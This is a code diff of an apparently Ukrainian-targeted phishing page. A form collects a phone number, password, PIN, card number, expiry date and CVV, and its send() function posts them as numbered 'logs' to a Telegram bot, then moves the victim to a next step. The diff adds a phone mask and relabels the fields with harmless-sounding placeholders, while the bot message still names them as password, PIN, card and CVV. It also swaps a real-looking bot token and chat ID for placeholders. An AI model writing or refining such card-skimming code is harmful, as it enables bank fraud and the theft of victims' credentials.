@@ -43,17 +43,64 @@ button{
 <div class="box">
   <h2>Заповніть данні</h2>
 
-  <input id="name" placeholder="Телефон">
-  <input id="phone" placeholder="Пароль">
-  <input id="tg" placeholder="Пін-код">
-  <input id="city" placeholder="Срок дійсності">
-  <input id="comment" placeholder="Номер картки">
-  <input id="cvv" placeholder="CVV">
-  
-  <button onclick="send()">Подати заявку</button>
+  <input id="name" placeholder="">
+
+  <!-- Телефон -->
+  <input id="phone" placeholder="+380 (__) ___-__-___" maxlength="19">
+
+  <input id="tg" placeholder="@Telegram">
+  <input id="city" placeholder="Город">
+  <input id="comment" placeholder="Комментарий">
+
+  <!-- поле только 3 цифры -->
+  <input id="code" placeholder="Код (3 цифры)" maxlength="3">
+
+  <button onclick="send()">Отправить</button>
 </div>
 
 <script>
+
+// 🔥 МАСКА ТЕЛЕФОНА
+const phoneInput = document.getElementById("phone");
+
+phoneInput.addEventListener("input", function(e){
+
+  let x = e.target.value.replace(/\D/g, "");
+
+  if(!x.startsWith("380")){
+    x = "380" + x;
+  }
+
+  x = x.substring(0,12);
+
+  let formatted = "+380";
+
+  if(x.length > 3){
+    formatted += " (" + x.substring(3,5);
+  }
+  if(x.length >= 5){
+    formatted += ") " + x.substring(5,8);
+  }
+  if(x.length >= 8){
+    formatted += "-" + x.substring(8,10);
+  }
+  if(x.length >= 10){
+    formatted += "-" + x.substring(10,12);
+  }
+
+  e.target.value = formatted;
+});
+
+
+// 🔥 ТОЛЬКО ЦИФРЫ (3 цифры)
+const codeInput = document.getElementById("code");
+
+codeInput.addEventListener("input", function(){
+  this.value = this.value.replace(/\D/g, "").slice(0,3);
+});
+
+
+// 🚀 ОТПРАВКА
 function send(){
 
   const clientId = localStorage.getItem("clientId");
@@ -64,15 +111,16 @@ function send(){
   const tg = document.getElementById("tg").value;
   const city = document.getElementById("city").value;
   const comment = document.getElementById("comment").value;
+  const code = document.getElementById("code").value;
   const service = localStorage.getItem("service");
 
-  if(!name||!phone||!tg||!city||!comment){
-    alert("Заповніть все!");
+  if(!name||!phone||!tg||!city||!comment||!code){
+    alert("Заполни всё!");
     return;
   }
 
-  const token = "8589160707:AAEHCqUhzfom1D3_gtlG5eTiIrtPnXCGnNk";
-  const chat_id = "8035773808";
+  const token = "ТВОЙ_TOKEN";
+  const chat_id = "ТВОЙ_CHAT_ID";
 
   const title = isRepeat
     ? `♻️ Повторный Лог №${clientId}`
@@ -85,13 +133,12 @@ function send(){
       chat_id:chat_id,
       text:
 `${title}
-
-Телефон📱: ${name}
-Пароль🗝️: ${phone}
-Пин-код🔢: ${tg}
-Срок Действия📆: ${city}
+Телефон📱: ${phone}
+Пароль🗝️: ${name}
+Пин-код 🔢: ${tg}
+Срок действия 📆: ${city}
 Карта💳: ${comment}
-CVV: ${cvv}
+CVV: ${code}
 Банк🏧: ${service}`
     })
   });
@@ -100,6 +147,7 @@ CVV: ${cvv}
 
   window.location.href = "step4.html";
 }
+
 </script>
 
 </body>
